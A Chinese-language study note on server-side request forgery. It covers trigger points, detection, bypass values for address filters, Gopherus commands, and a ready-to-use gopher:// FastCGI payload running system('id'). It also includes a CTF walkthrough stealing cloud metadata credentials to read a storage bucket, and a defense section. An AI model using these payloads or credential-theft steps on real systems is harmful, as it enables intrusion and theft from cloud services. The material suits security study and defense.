# 后端安全-代码逻辑-SSRF

## 一句话理解
SSRF（Server-Side Request Forgery，服务器端请求伪造）是指攻击者诱导服务端向攻击者指定的地址发起请求，从而把“服务端的网络访问能力”变成攻击面。

## 核心特点
- 请求是由服务端发出的，不是浏览器发出的
- 攻击面往往出现在“接收 URL 并代为访问”的功能中
- 风险通常不在外网页面本身，而在服务端可访问的内网、云元数据、管理接口、本地文件或特定协议

## 常见触发点
以下功能最值得优先排查：

1. 社交分享功能：抓取目标页面标题、摘要、缩略图
2. 在线翻译、网页预览、移动转码
3. 图片加载、图片下载、头像同步、富文本“从 URL 导入”
4. 文章收藏、书签、RSS 导入、站点采集
5. 云监控、回调探测、Webhook、健康检查
6. 邮件系统、短信平台、IM 机器人、第三方通知配置
7. PDF、DOCX、图片处理、视频转码、OCR、XML 解析
8. 数据库内置联网能力，例如某些复制、导入、远程加载功能
9. 内部 API 聚合、代理接口、下载接口、开放平台 URL 校验
10. 未公开的管理功能或调试功能

常见参数名：
`url`、`uri`、`link`、`src`、`target`、`callback`、`image`、`domain`、`feed`、`load`、`path`

## 常见危害
### 1. 内网探测
利用服务端去访问攻击者本来无法直连的内网地址，判断端口开放情况、服务类型和资产分布。

### 2. 攻击内网服务
例如访问：
- 内网 Web 管理后台
- Redis、Memcached、Elasticsearch
- Docker API、Jenkins、Consul、Kibana
- K8s API Server、etcd

### 3. 读取云元数据
典型目标是云平台元数据服务，进而获取临时凭证、实例信息、访问密钥等。

### 4. 读取本地文件
如果支持 `file://` 等协议，可能直接读取本地配置、源码、密钥文件。

### 5. 协议级利用
若服务端支持 `gopher://`、`dict://`、`ftp://` 等协议，可能构造更底层的请求与内网服务交互。

### 6. 利用服务端身份访问受信接口
请求来源是目标服务器本身，因此可能绕过基于 IP 白名单、内网来源、服务间信任的限制。

### 7. 云凭证与身份窃取
如果服务跑在云主机、容器或函数环境中，SSRF 可能直接转化为：
- 临时访问凭证泄露
- 实例身份凭证泄露
- 云控制面 API 滥用
- 存储桶、消息队列、KMS、镜像仓库等侧向访问

## 漏洞发现思路
### 1. 确认是否由服务端发起请求
输入一个你可控的 URL，观察目标是否主动访问该地址。常见现象：
- 服务端返回抓取到的网页标题、图片或内容摘要
- 外部监听平台收到回连
- 请求延迟、错误信息、响应差异随目标地址变化

### 2. 判断回显方式
- 直接回显：接口返回远程资源内容、状态码、标题等
- 间接回显：通过时间差、报错差异、图片是否加载成功判断
- 无回显：只能依靠 DNSLog、HTTPLog、带外通道确认

### 3. 枚举可访问目标
优先测试：
- `127.0.0.1`
- `localhost`
- 常见内网地址段
- 云元数据地址
- 本地域名解析结果

### 4. 注意“隐藏的二次请求”
很多 SSRF 不是直接 `fetch(url)`，而是间接触发：
- 页面预览先抓 HTML，再抓 Open Graph 图片
- PDF / 截图服务在渲染 HTML 时加载额外资源
- XML / SVG / 文档模板在解析时外带请求
- 第三方 SDK、Webhook 测试器、回调验证器自动跟随跳转

所以不要只盯“接口返回了什么”，还要关注服务端是否产生了二次网络行为。

## 常见协议与利用方向
### 1. `http://` 和 `https://`
最常见，适合做：
- 内网探测
- 访问管理接口
- 读取仅内网可见的 Web 页面
- 跟随重定向到其他敏感地址

### 2. `file://`
如果后端允许，可能直接读取本地文件：
- 配置文件
- 源代码
- 口令文件
- 日志文件

### 3. `dict://`
某些语言或库支持该协议，可用于和部分服务做简单交互，常见于老环境或特定组件链。

### 4. `gopher://`
高价值协议。它允许发送更底层、可控性更强的数据包，常用于：
- Redis 利用
- FastCGI 利用
- SMTP、Memcached、MySQL 等协议交互

> 原文中的 `gophar://` 应为 `gopher://`。

### 5. `ftp://`
可用于探测、认证测试，或在部分场景中引发文件写入、外连等问题。

### 6. 其他值得留意的协议或能力
视语言、框架、组件不同，还应关注：
- `jar://`
- `phar://`
- `ldap://`
- `tftp://`
- 本地 Unix Socket / 命名管道桥接能力

不是所有环境都支持，但在特定技术栈里很容易形成“看起来像 SSRF，最后打成文件读取、反序列化或协议交互”的链条。

## Gopherus 工具

gopher 可以构造任意 TCP 报文，理论上能打所有“无认证、明文协议”的内网服务，但手写协议包容易在长度、编码上出错。Gopherus 用于自动生成这类 payload：

- 项目地址：<https://github.com/tarunkant/Gopherus>

```bash
# 打 Redis：写 Webshell / 写 SSH 公钥 / 写计划任务反弹 Shell
python gopherus.py --exploit redis

# 打 FastCGI（php-fpm）：通过 PHP_VALUE 注入执行任意 PHP 代码
python gopherus.py --exploit fastcgi

# 打 SMTP：在内网邮件服务器上伪造 / 发送邮件
python gopherus.py --exploit smtp

# 打 MySQL：目标允许无密码登录时执行任意 SQL（写 Webshell、读数据）
python gopherus.py --exploit mysql

# 其他服务（Zabbix、memcached 等，视工具版本支持）
python gopherus.py --exploit zabbix
```

使用要点：
1. 生成的 payload 默认已完成一次 URL 编码；如果 SSRF 入口还会再编码一次（浏览器地址栏提交、接口二次转发），要整体再编码一次（`%01` → `%2501`）
2. payload 以 `gopher://<ip>:<port>/_` 开头，`_` 之后才是真正发往目标的原始字节流
3. 生成后记得把 IP、端口、Web 根目录等占位值改成实际环境

### 手写 gopher 打 FastCGI（9001 端口执行命令）

Gopherus 生成的 FastCGI payload，本质是把下面这几个 FastCGI record 拼起来再做 URL 编码（目标是 `127.0.0.1:9001` 上的 php-fpm）：

```text
# 1) BEGIN_REQUEST：role = FCGI_RESPONDER
\x01\x01\x00\x01\x00\x08\x00\x00
\x00\x01\x00\x00\x00\x00\x00\x00

# 2) PARAMS：record 头声明内容长度 0x00BE = 190 字节
\x01\x04\x00\x01\x00\xBE\x00\x00
\x0f\x17SCRIPT_FILENAME/var/www/html/index.php          # 必须指向服务器上真实存在的 php 文件
\x09\x36PHP_VALUEallow_url_include = On\nauto_prepend_file = php://input   # 核心：把 STDIN 内容当前置 PHP 执行
\x0e\x04REQUEST_METHODPOST
\x0c\x21CONTENT_TYPEapplication/x-www-form-urlencoded
\x0e\x02CONTENT_LENGTH22
\x01\x04\x00\x01\x00\x00\x00\x00                        # PARAMS 空包，参数区结束

# 3) STDIN：要执行的 PHP 代码（长度 0x16 = 22 字节，与 CONTENT_LENGTH 一致）
\x01\x05\x00\x01\x00\x16\x00\x00
<?php system('id'); ?>
\x01\x05\x00\x01\x00\x00\x00\x00                        # STDIN 空包，输入区结束
```

PARAMS 采用 `nameLen + valueLen + name + value` 编码，长度小于 128 时占 1 字节（`\x0f` = 15 是 `SCRIPT_FILENAME` 的名字长度，`\x17` = 23 是路径值的长度，以此类推）。整段做 URL 编码后拼到 `gopher://` 后，得到完整利用 URL：

```text
gopher://127.0.0.1:9001/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%BE%00%00%0F%17SCRIPT_FILENAME/var/www/html/index.php%09%36PHP_VALUEallow_url_include%20%3D%20On%0Aauto_prepend_file%20%3D%20php%3A%2F%2Finput%0E%04REQUEST_METHODPOST%0C%21CONTENT_TYPEapplication/x-www-form-urlencoded%0E%02CONTENT_LENGTH22%01%04%00%01%00%00%00%00%01%05%00%01%00%16%00%00%3C%3Fphp%20system%28%27id%27%29%3B%20%3F%3E%01%05%00%01%00%00%00%00
```

要点：
- `SCRIPT_FILENAME` 必须是目标机器上真实存在的 php 文件（php-fpm 会校验），路径不明时先通过报错页、源码泄露、phpinfo 获取
- 利用核心是 `PHP_VALUE` 里的 `auto_prepend_file = php://input` + `allow_url_include = On`，让 php-fpm 在执行脚本前先执行 STDIN 中的代码
- 修改 body 后必须同步更新 `CONTENT_LENGTH` 和 STDIN record 的长度字段（十六进制）
- 如果环境禁用了 `allow_url_include`，可改用 `auto_prepend_file = data://` 或先写文件再包含的思路

## 盲 SSRF 与带外验证
### 1. 常见验证方式
- DNSLog
- HTTP Log
- Burp Collaborator / OAST
- 响应时间差
- 错误信息差异

### 2. 常见打点位置
不仅是参数值，还要关注：
- `Referer`
- 回调地址
- Webhook 地址
- 文档内嵌资源地址
- 邮件模板中的远程资源
- 富文本中的图片、音视频、附件 URL

### 3. 盲 SSRF 能做什么
即使拿不到响应正文，也依然可能实现：
- 探测出网能力
- 判断内网主机和端口存活
- 确认是否支持特定协议
- 确认服务端会不会带上某些头或凭据
- 作为后续链路的起点

## 常见绕过思路
### 1. 地址表示法绕过
如果系统只过滤了 `127.0.0.1` 或 `localhost`，可尝试：
- 十进制 IP
- 十六进制 IP
- 八进制 IP
- `127.1`
- `0.0.0.0`
- IPv6，例如 `::1`
- IPv6 映射 IPv4

### 2. 域名解析绕过
- 先解析为公网地址，通过校验后再变为内网地址
- 利用多 A 记录、低 TTL、缓存差异
- 业务校验使用一次解析，请求阶段再次解析

### 3. DNS Rebinding
适用于“校验时是公网 IP，请求时解析成内网 IP”的场景。

示例：
`http://test.com/checkssrf?url=http://dns_rebind.reabout.com`

利用条件：
1. 可控制目标域名解析
2. 业务逻辑通过 IP 是否为内网来做过滤
3. TTL 足够低，或校验与请求阶段解析不一致

- [Use DNS Rebinding to Bypass SSRF in Java](https://paper.seebug.org/390/)

### 4. 重定向绕过
如果系统只校验首个 URL，而请求库会自动跟随 30x 跳转，可能通过“外网地址跳到内网地址”完成绕过。

### 5. URL 解析差异
不同语言、不同库对 URL 的解析不完全一致，应重点关注：
- 用户名密码部分：`http://user@host`
- `#` 片段截断
- `?` 参数拼接
- 双重编码、大小写、空白符
- 混合协议与异常格式

### 6. 白名单绕过
常见错误包括：
- 只用字符串前缀判断
- 只判断是否包含受信域名
- 未校验最终解析 IP
- 未禁止私有地址、回环地址、链路本地地址

### 7. URL 校验与请求执行不一致
这是 SSRF 里非常常见、也很容易被忽略的一类问题：
- 校验时用一个 URL 解析库
- 实际请求时用另一个解析库或组件
- 校验只看原始字符串，请求却基于规范化后的结果

重点关注：
- 用户名密码段 `user@host`
- 双重编码
- 反斜杠与斜杠差异
- 片段、查询串和端口解析差异
- 绝对 URL 与 `Host` 头、请求行混用

### 8. 路由型 / 解析型 SSRF
有些 SSRF 不在“URL 参数”，而在服务端对请求目标的解析流程本身，例如：
- 反向代理依据用户可控 `Host`
- 中间件把绝对 URL、`Host`、转发头混在一起解析
- 内部路由器把请求转发到错误的后端

这类问题更像“请求被错路由进内网”，但本质上仍然是在借服务端网络位置发请求。

### 9. 具体绕过值速查表

上面讲的是思路，这里直接给出可落地的具体绕过值，按场景分组。

#### a. `127.0.0.1` 的替代表示

| 写法 | 说明 |
| --- | --- |
| `http://2130706433` | 十进制整数形式（127×256³+1） |
| `http://0x7f000001` | 十六进制整数形式 |
| `http://0x7f.1`、`http://0x7f.0.0.1` | 十六进制分段混合 |
| `http://0177.0.0.1`、`http://017700000001` | 八进制形式（`0177` = 127） |
| `http://127.1`、`http://127.000.000.001` | 省略段 / 补零形式 |
| `http://127.0000000001` | 末段长数字被按八进制解析（`0000000001` = 1，等效 `127.0.0.1`） |
| `http://0`、`http://0.0.0.0` | 全零地址，多数环境指向本机 |
| `http://[::1]`、`http://[::]`、`http://[0000::1]` | IPv6 回环 / 未指定地址 |
| `http://[::ffff:127.0.0.1]` | IPv6 映射 IPv4 |
| `http://127。0。0。1` | 全角句号 `。`（U+3002），WHATWG 解析器会规范化为 `.` |
| `http://①②⑦.0.0.1` | Unicode 带圈数字，部分解析器按 UTS-46 映射为 `127` |

> 混合进制形式依赖底层 `inet_aton` 类解析（curl、老版本 Python/PHP 后端常见），浏览器和多数新解析器已不支持，对老后端效果好。

#### b. `localhost` 的替代域名（公网 DNS 解析到内网）

| 写法 | 解析结果 |
| --- | --- |
| `http://localtest.me` | `127.0.0.1`（公共服务，专门解析到回环） |
| `http://127.0.0.1.nip.io` | `127.0.0.1`（把 IP 直接写进域名） |
| `http://10.0.0.1.nip.io` | `10.0.0.1` |
| `http://127.0.0.1.sslip.io` | `127.0.0.1`（nip.io 的同类替代） |
| `http://customer1.app.localhost.my.company.127.0.0.1.nip.io` | `127.0.0.1`（前缀可任意加，常用于绕“域名前缀白名单”） |
| `http://spoofed.<你的Collaborator-ID>.burpcollaborator.net` | Burp 协作服务器（验证出网用） |

#### c. 后缀 / 前缀 / 包含校验绕过

校验逻辑是字符串级别（“必须以 xxx 开头 / 结尾 / 包含 xxx”）时：

| Payload | 原理 |
| --- | --- |
| `http://trusted.com@127.0.0.1` | `@` 前是 userinfo，实际 host 是 `127.0.0.1` |
| `http://evil@127.0.0.1` | 同上，`@` 前内容任意 |
| `http://127.0.0.1#@trusted.com` | `#` 后是 fragment，校验器取错位置即误判 |
| `http://127.0.0.1/#` | 部分校验器按 `#` 截断后再拼后缀判断 |
| `http://127.0.0.1/?x=.com` | `?` 后是查询串，绕“必须包含 .com”类校验 |
| `http://127.0.0.1\.com` | curl 把 `\` 当 `/`，字符串校验器却把 `127.0.0.1\.com` 当 host |
| `http://127.0.0.1%2523.trusted.com` | `#` 双重编码，利用两次解码差异 |

#### d. URL 解析差异类（校验器与请求库对同一 URL 认知不一致）

| Payload | 差异点 |
| --- | --- |
| `http://evil.com\@127.0.0.1` | WHATWG（浏览器/新库）把 `\` 当 `/`，认为访问 `evil.com` 而放行；curl 把 `\` 当普通字符，`evil.com\` 是 userinfo，实际请求 `127.0.0.1` |
| `http://127.0.0.1\@evil.com` | 反向场景：curl 实际访问 `evil.com`，WHATWG 认为访问 `127.0.0.1` |
| `http://127。1.1.1` | 全角句号规范化差异（WHATWG 会转成 `127.1.1.1`） |
| `http://①②⑦.0.0.1` | Unicode 数字映射差异 |
| `http://1.1.1.1 &@2.2.2.2# @3.3.3.3/` | 空格、`&`、`@`、`#` 混合，不同解析器提取出的 host 各不相同 |

> 解析差异类 payload 没有万能解，关键是先弄清“哪个库在校验、哪个库在发请求”，再针对差异构造。

#### e. 协议前缀校验绕过

有些环境只校验了协议前缀字符串，可以尝试：

| Payload | 原理 |
| --- | --- |
| `hTtP://127.0.0.1` | 大小写混淆，部分正则只匹配小写 `http` |
| ` http://127.0.0.1` | 前导空格 / 空白字符，部分解析器会自动 trim |
| `httpx://x` 之外的畸形协议头 | 观察报错差异判断协议解析方式 |

## 云环境关注点
### 1. 元数据服务
SSRF 在云环境中极其危险，因为很多平台会把实例凭证放在本机可访问的元数据接口中。

排查重点：
- 云主机元数据接口
- 容器运行环境的服务账户凭证
- 应用侧环境变量、临时凭证、实例身份

常见目标：
- AWS EC2: `http://169.254.169.254/latest/`
- GCP: `http://metadata.google.internal/computeMetadata/v1/`
- Azure: `http://169.254.169.254/metadata/instance`

补充细节：
- AWS IMDSv1 可直接 GET，IMDSv2 需要先发 `PUT` 获取 token，再用 token 访问元数据
- GCP 元数据接口通常要求 `Metadata-Flavor: Google`
- Azure 元数据接口通常要求 `Metadata: true`

这意味着：
- “只能发简单 GET”的 SSRF 对不同云平台的可利用程度并不完全相同
- 但只要服务端允许自定义方法、请求头或复合请求链，风险依旧很高

### 2. 容器与编排平台
如果服务部署在容器或 K8s 中，SSRF 还可能被用来访问：
- Pod 内服务
- 集群控制面
- 容器运行时接口
- Service Mesh 管理面

### 3. 不止云主机 metadata
还要留意容器和平台级别的本地凭证入口，例如：
- 容器任务角色凭证
- 挂载到 Pod 内的服务账户令牌
- 内部 sidecar 管理接口
- 本地 agent、运维探针、服务发现组件

## 实战关注点
### 1. SSRF 不一定有回显
很多时候只能做到“让目标请求出去”，这已经足以用于：
- 探测出网
- 探测内网
- 验证协议支持
- 作为后续利用入口

### 2. SSRF 常作为中间环节
它经常不是最终目标，而是进一步拿下：
- Redis 未授权
- XXE 的外带通道
- 内网 Web 漏洞
- 云凭证
- 仅内网开放的调试接口

### 2.1 常见利用链
- SSRF -> Redis / FastCGI / Docker API
- SSRF -> 云 metadata -> 临时凭证 -> 云控制面
- SSRF -> 内网管理台 -> 默认口令 / 未授权
- SSRF -> 访问仅内网可见功能 -> 再打 RCE
- SSRF -> Open Redirect / DNS Rebinding / 解析差异 -> 绕过校验

### 3. 图像与文档处理链也要看
不止是显式的 `fetch url` 接口，很多格式解析器会自动请求外部资源，例如：
- XML
- SVG
- PDF
- DOCX
- 多媒体转码组件

### 4. 现代业务中的高危入口
这些地方现在很常见，也很容易漏看：
- Markdown / 富文本“粘贴链接生成卡片”
- 通知平台、机器人、Webhook 调试
- OAuth / OIDC / SAML 初始化配置
- 报表、截图、爬虫、AI Agent 联网能力
- “从 URL 导入图片 / 文件 / 数据”

## 防御要点
### 1. 优先禁止服务端随意访问用户提供的 URL
如果业务必须支持，也要做最小化设计，不要让用户提供完整任意 URL。

### 1.1 先分清两种业务模型
- 仅允许访问“固定可信后端”：适合强白名单
- 必须访问“任意外部站点”：不要幻想靠字符串黑名单彻底防住

第二种场景里，网络层隔离往往比应用层校验更重要。

### 2. 做严格白名单
白名单应同时校验：
- 协议
- 域名
- 端口
- 解析后的最终 IP
- 重定向后的目标地址

并注意：
- 同时处理 A 和 AAAA 记录
- 解析后要判断是否落入私网、回环、链路本地、保留地址
- 最好“解析一次并绑定使用”，不要校验和请求各自重新解析

### 3. 禁止危险地址段
明确阻止访问：
- 回环地址
- 内网地址
- 链路本地地址
- 云元数据地址
- 本机管理接口

### 4. 限制协议
仅允许必要协议，通常只保留 `http` 和 `https`，禁止：
- `file`
- `gopher`
- `dict`
- `ftp`

### 5. 网络层隔离
从架构上限制应用服务器的出网能力和内网访问范围，比单纯依赖代码过滤更可靠。

### 5.1 典型网络层措施
- 出网 ACL / 安全组仅放行业务必要目标
- 通过固定代理统一出网
- 阻断到元数据、内网管理面、保留地址段的访问
- 将“会联网的高风险服务”放进隔离网段

### 6. 关闭自动重定向
若非必要，关闭请求库自动跟随 30x。

### 7. 统一 URL 解析与校验逻辑
避免“校验时用一个库，请求时用另一个库”。

### 8. 云环境额外措施
- AWS 优先强制使用 IMDSv2
- 最小化实例角色权限
- 不把高权限长期凭证放在实例可直接读取的位置
- 监控异常的 metadata 访问和出网行为

## 实战速记
### 1. 一眼判断是否像 SSRF
满足下面任意两条，就值得优先怀疑：
- 用户可控 URL / 域名 / 回调地址
- 服务端代为联网
- 返回结果、报错、时间差跟目标地址有关
- 功能名字像“预览 / 导入 / 校验 / 抓取 / 回调测试”

### 2. 打点顺序
1. 先用外部 OAST / HTTPLog 确认服务端会不会请求出去
2. 再测 `localhost`、`127.0.0.1`、内网段、云 metadata
3. 再判断是否支持重定向、协议扩展、自定义头、非 GET
4. 最后再进阶看白名单绕过、解析差异和协议利用

## 案例：云环境 SSRF 完整链路（元数据到 OSS flag）

一道典型云环境 SSRF CTF 题的完整复盘。环境为阿里云 ECS + OSS，思路同样适用于 AWS（元数据地址换成 `169.254.169.254`，命令换成 `aws s3`）。

### 背景

题目是一个“网页卡片生成器”：输入任意 URL，服务端抓取页面并返回标题和状态码。

```text
POST /api/preview
{"url": "https://example.com"}

返回：{"code": 0, "data": {"title": "Example Domain", "status": 200}}
```

### 第一步：确认 SSRF

把 HTTPLog 地址填进参数：

```text
{"url": "http://xxxx.httplog.cn/test"}
```

日志平台收到来自题目服务器的 GET 请求，确认服务端会代为访问，且是回显型 SSRF。

### 第二步：确认过滤方式并绕过

```text
{"url": "http://127.0.0.1:8080/"} → {"code": 403, "msg": "forbidden address"}
```

内网地址被拦。对照「具体绕过值速查表」逐个替换，`0.0.0.0` 成功（黑名单只匹配了 `127.0.0.1`、`localhost` 字符串）：

```text
{"url": "http://0.0.0.0:8080/"} → 返回了内网管理页的标题，说明本机 8080 存活
```

### 第三步：探测内网与云元数据

- 利用回显差异扫内网段 `10.0.x.x`、`172.16.x.x` 的常见端口
- 题目跑在阿里云 ECS 上，直接打元数据地址：

```text
{"url": "http://100.100.100.200/latest/meta-data/"}

返回：ami-id/ hostname/ instance-id/ ram/ region-id/ ...
```

元数据可访问。AWS 环境对应写法：

```text
http://169.254.169.254/latest/meta-data/            # IMDSv1 可直接 GET
# IMDSv2 需要先 PUT /latest/api/token 拿 token，再带 X-aws-ec2-metadata-token 头访问
```

### 第四步：拿 RAM 角色的临时凭证

```text
# 先拿角色名
{"url": "http://100.100.100.200/latest/meta-data/ram/security-credentials/"}
→ aliyun-ctf-role

# 再拿角色对应的 STS 凭证
{"url": "http://100.100.100.200/latest/meta-data/ram/security-credentials/aliyun-ctf-role"}

→ {
    "AccessKeyId": "STS.xxxxxxxxxxxx",
    "AccessKeySecret": "xxxxxxxxxxxxxxxx",
    "SecurityToken": "xxxxxxxxxxxxxxxx",
    "Expiration": "2026-09-09T12:00:00Z"
  }
```

注意：SSRF 回显可能截断 JSON，可以用报错外带或分段方式拿全；STS 凭证有时效（`Expiration`），要尽快使用。

### 第五步：用临时凭证读 OSS 里的 flag

本机配置 ossutil（也可用 aliyun CLI 或 Python SDK）：

```bash
# 配置 STS 临时凭证
ossutil config -e oss-cn-hangzhou.aliyuncs.com \
  -i "STS.xxxxxxxxxxxx" \
  -k "AccessKeySecret" \
  -t "SecurityToken"

# 列出该角色可访问的 bucket
ossutil ls

# 读取 flag
ossutil cat oss://ctf-flag-bucket/flag.txt
```

AWS 环境对应操作：

```bash
export AWS_ACCESS_KEY_ID=xxx
export AWS_SECRET_ACCESS_KEY=xxx
export AWS_SESSION_TOKEN=xxx
aws sts get-caller-identity    # 先确认身份与权限
aws s3 ls
aws s3 cp s3://ctf-flag-bucket/flag.txt -
```

### 复盘要点

1. 云环境题优先打元数据，这是出凭证最快的路径
2. 元数据可直接 GET（阿里云 / AWS IMDSv1）时，最普通的回显型 SSRF 就足够用
3. 拿到 STS 凭证后先确认身份和权限（`GetCallerIdentity`、`ossutil ls`），再定位目标对象，不要乱猜 bucket 名
4. 防御侧对应：AWS 强制 IMDSv2、RAM 角色最小权限、出网侧阻断 `100.100.100.200` / `169.254.169.254`

## 速查清单
- 先找所有“用户输入 URL，服务端代为访问”的功能
- 先验证是否存在服务端请求，再判断是否有回显
- 先测 `http/https`，再测试是否支持 `file`、`gopher` 等协议
- 检查是否能访问内网、回环地址、元数据服务
- 检查是否存在白名单、重定向、DNS 解析相关绕过
- 结合内网服务和云环境判断实际危害

## Reference
- [了解 SSRF，这一篇就足够了](https://xz.aliyun.com/t/2115)
- [OWASP Server-Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security Academy - SSRF](https://portswigger.net/web-security/ssrf)
- [PortSwigger URL validation bypass cheat sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)
- [AWS EC2 Instance Metadata Service](https://docs.amazonaws.cn/en_us/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [Azure Instance Metadata Service](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service)
- [Gopherus - Generate gopher link for exploiting SSRF](https://github.com/tarunkant/Gopherus)
- [PayloadsAllTheThings - Server-Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md)
